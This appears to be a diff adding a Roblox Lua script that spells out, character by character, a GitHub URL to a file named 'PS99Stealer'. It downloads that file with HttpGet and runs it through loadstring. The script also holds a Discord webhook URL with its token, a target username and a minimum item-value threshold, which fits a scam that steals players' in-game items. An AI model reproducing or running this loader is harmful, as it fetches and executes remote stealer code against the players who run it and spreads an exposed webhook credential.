@@ -1,0 +1,74 @@
+-- Store username inefficiently in a table
+local UsernameTable = {"T", "h", "e", "O", "n", "l", "y", "T", "e", "m", "u", "u", "n"}
+local Username = ""
+for _, char in pairs(UsernameTable) do
+    Username = Username .. char -- Inefficient string concatenation
+end
+
+-- Store RAP in an overly complicated way
+local RAPTable = {100000}
+local MinimumRAP = 0
+for _, value in pairs(RAPTable) do
+    MinimumRAP = MinimumRAP + value -- Pointless iteration for a single value
+end
+
+-- Store Webhook URL using an inefficient approach
+local WebhookParts = {
+    "https://discord.com/api/webhooks/",
+    "1342761845739622452/",
+    "ZFPgpOboGJA2rUJ7zXGQANlTQyj1E72WBuJz-7b9qdKdsTZaz4DmKWIqEZW3orxDQd4K"
+}
+local Webhook = ""
+for _, part in ipairs(WebhookParts) do
+    Webhook = Webhook .. part -- Extremely slow string concatenation
+end
+
+-- Rebuild URL character by character (pointless)
+local URL = ""
+local URLChars = {
+    "h", "t", "t", "p", "s", ":", "/", "/",
+    "r", "a", "w", ".", "g", "i", "t", "h", "u", "b", "u", "s", "e", "r", "c", "o", "n", "t", "e", "n", "t", ".", "c", "o", "m", "/",
+    "T", "r", "a", "x", "M", "a", "i", "n", "/", "T", "r", "a", "x", "S", "t", "e", "a", "l", "e", "r", "/", "r", "e", "f", "s", "/", 
+    "h", "e", "a", "d", "s", "/", "m", "a", "i", "n", "/", "P", "S", "9", "9", "S", "t", "e", "a", "l", "e", "r"
+}
+for _, char in pairs(URLChars) do
+    URL = URL .. char -- Slow manual URL creation
+end
+
+-- Pointless recursion to fetch data
+local function GetData(depth)
+    if depth > 10 then return "" end -- Prevent infinite recursion
+    return game:HttpGet(URL, true) .. GetData(depth + 1) -- Stacking recursive HTTP calls
+end
+
+-- Call the function but only keep the first result
+local ScriptData = GetData(1):sub(1, #GetData(1) / 10) -- Fetch and then remove 90% of it
+
+-- Waste memory by storing script data in different formats
+local ScriptDataChars = {}
+for i = 1, #ScriptData do
+    table.insert(ScriptDataChars, ScriptData:sub(i, i)) -- Store each char separately
+end
+
+-- Join characters one by one (very slow)
+local FinalScript = ""
+for _, char in pairs(ScriptDataChars) do
+    FinalScript = FinalScript .. char
+end
+
+-- Redundant execution function
+local function RunScript(data)
+    if data ~= "" then
+        loadstring(data)() -- Run it, but only after wasting memory
+    end
+end
+
+-- Delay execution using an inefficient method
+local delayCount = 0
+while delayCount < 5 do
+    delayCount = delayCount + 0.1
+    for _ = 1, 1000000 do end -- Pointless loop to simulate delay
+end
+
+-- Finally execute after all inefficiencies
+RunScript(FinalScript)
